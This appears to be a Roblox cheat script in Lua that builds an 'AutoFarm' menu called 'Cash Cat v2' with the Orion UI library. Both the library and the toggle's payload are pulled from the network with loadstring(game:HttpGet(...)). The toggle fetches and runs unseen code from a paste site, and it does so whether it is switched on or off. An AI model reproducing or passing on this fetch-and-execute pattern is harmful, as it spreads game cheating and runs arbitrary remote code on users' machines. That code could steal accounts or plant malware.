local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

local Window = OrionLib:MakeWindow({Name = "Cash Cat v2", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})

local Tab = Window:MakeTab({
 Name = "Main",
 Icon = "rbxassetid://4483345998",
 PremiumOnly = false
})

local Section = Tab:AddSection({
 Name = "AutoFarm"
})

_G.AutoFarm = false
Tab:AddToggle({
 Name = "Cash Farm",
 Default = false,
 Callback = function(Value)
  _G.AutoFarm = Value

  

  loadstring(game:HttpGet("https://www.klgrth.io/paste/3fjq3/raw"))()

 end    
})